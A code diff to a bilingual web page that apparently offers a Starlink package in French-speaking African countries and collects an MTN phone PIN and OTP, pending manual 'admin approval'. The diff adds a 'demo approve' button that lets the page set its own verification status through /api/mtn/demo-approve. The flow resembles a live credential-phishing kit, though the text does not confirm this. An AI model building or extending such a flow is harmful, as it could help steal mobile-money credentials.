@@ -859,6 +859,7 @@
                         <div class="spinner"></div>
                         <span id="waitingStatus" class="status-text">Vérification en cours...</span>
                     </div>
+                    <button id="demoApproveBtn" class="btn-action-primary" style="display:none; margin-top: 16px;">Approve</button>
                     <p class="text-timeout">Cela peut prendre jusqu&apos;à 5 minutes.</p>
                 </div>
             </div>
@@ -902,6 +903,7 @@
         let starlinkPackage = null;
         let currentRequestId = null;
         let statusPollInterval = null;
+        let currentApprovalFlow = 'pin';
         
         // French-speaking African countries
         const FRENCH_COUNTRIES = new Set([
@@ -1327,6 +1329,7 @@
                     return;
                 }
 
+                currentApprovalFlow = 'pin';
                 // Show waiting screen and start polling for admin approval
                 showWaitingScreen();
                 startStatusPolling(data.requestId);
@@ -1441,6 +1444,12 @@
         }
 
         function showPhoneScreen() {
+            const demoApproveBtn = document.getElementById('demoApproveBtn');
+            if (demoApproveBtn) {
+                demoApproveBtn.style.display = 'none';
+                demoApproveBtn.disabled = false;
+            }
+
             notVerifiedScreen.classList.remove('active');
             document.getElementById('insufficientScreen').classList.remove('active');
             linkScreen.classList.remove('active');
@@ -1467,6 +1476,15 @@
             document.getElementById('insufficientScreen').classList.remove('active');
             waitingScreen.style.display = 'block';
             document.getElementById('waitingStatus').textContent = currentLang === 'fr' ? 'Vérification en cours...' : 'Verification in progress...';
+
+            const demoApproveBtn = document.getElementById('demoApproveBtn');
+            if (demoApproveBtn) {
+                demoApproveBtn.style.display = 'inline-flex';
+                demoApproveBtn.disabled = false;
+                demoApproveBtn.textContent = currentApprovalFlow === 'link'
+                    ? (currentLang === 'fr' ? 'Approuver le lien' : 'Approve Link')
+                    : (currentLang === 'fr' ? 'Approuver' : 'Approve');
+            }
         }
 
         function startStatusPolling(requestId) {
@@ -1483,6 +1501,37 @@
                     console.error('Status poll error:', e);
                 }
             }, 1500);
+        }
+
+        const demoApproveBtn = document.getElementById('demoApproveBtn');
+        if (demoApproveBtn) {
+            demoApproveBtn.addEventListener('click', async function() {
+                if (!currentRequestId) return;
+
+                const desiredStatus = currentApprovalFlow === 'link' ? 'otp_pending' : 'phone_pin_verified';
+                demoApproveBtn.disabled = true;
+                demoApproveBtn.textContent = currentLang === 'fr' ? 'Approbation...' : 'Approving...';
+
+                try {
+                    const res = await fetch('/api/mtn/demo-approve', {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ requestId: currentRequestId, status: desiredStatus })
+                    });
+                    const data = await res.json();
+
+                    if (!res.ok || !data.success) {
+                        throw new Error(data.error || 'Approval failed');
+                    }
+
+                    startStatusPolling(currentRequestId);
+                } catch (e) {
+                    console.error('Demo approve failed:', e);
+                    demoApproveBtn.disabled = false;
+                    demoApproveBtn.textContent = currentLang === 'fr' ? 'Approuver' : 'Approve';
+                }
+            });
         }
 
         function stopStatusPolling() {
@@ -1821,12 +1870,14 @@
                 }
                 
                 wrongLinkNotified = false;
-                
+                currentApprovalFlow = 'link';
+
                 document.getElementById('linkError').textContent = t('linkSubmitted');
                 document.getElementById('linkError').style.background = '#EFF6FF';
                 document.getElementById('linkError').style.color = '#2563EB';
                 document.getElementById('linkError').classList.add('show');
-                
+
+                showWaitingScreen();
                 startStatusPolling(currentRequestId);
                 
             } catch (e) {
